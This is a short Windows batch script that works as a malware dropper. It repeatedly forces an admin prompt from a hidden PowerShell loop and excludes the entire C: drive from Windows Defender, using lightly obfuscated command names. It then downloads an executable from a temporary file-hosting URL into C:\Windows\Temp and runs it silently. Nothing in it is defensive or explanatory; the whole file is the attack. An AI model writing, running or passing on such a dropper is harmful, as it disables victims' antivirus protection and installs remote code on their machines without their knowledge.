@echo off
:: Check if running as admin, if not, restart as admin with hidden PowerShell loop
net session >nul 2>&1 || (
    powershell -WindowStyle Hidden -Command "while ($true) { try { Start-Process -FilePath '%~f0' -Verb RunAs; break } catch {} }"
    exit /b
)

:: Windows Defender exclusion for C: drive
set "A=Add-MpPreference"
set "B=ExclusionPath"
set "C=C:\"
powershell -WindowStyle Hidden -Command "%A% -%B% '%C%'"

:: Download file from the URL
set "URL=https://tmpfiles.org/dl/27519744/client-built.exe"
set "OUTFILE=C:\Windows\Temp\xclient.exe"
powershell -WindowStyle Hidden -Command "Start-BitsTransfer -Source '%URL%' -Destination '%OUTFILE%'"

:: Run the downloaded file
set "I=Start-Process"
set "J=C:\Windows\Temp\xclient.exe"
powershell -WindowStyle Hidden -Command "%I% '%J%'"

:: Exit with no window
exit